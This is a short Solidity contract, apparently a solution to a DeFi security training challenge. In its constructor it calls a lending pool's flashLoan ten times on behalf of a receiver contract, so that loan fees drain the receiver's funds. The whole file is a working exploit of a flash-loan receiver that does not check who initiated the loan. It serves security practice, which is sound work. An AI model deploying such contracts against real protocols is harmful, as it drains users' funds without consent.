// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract FlashLoanAttacker {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(
        NaiveReceiverLenderPool _pool,
        IERC3156FlashBorrower _receiver
    ) {
        for (uint i = 0; i < 10; i++) {
            _pool.flashLoan(_receiver, ETH, 1 ether, "0x");
        }
    }
}
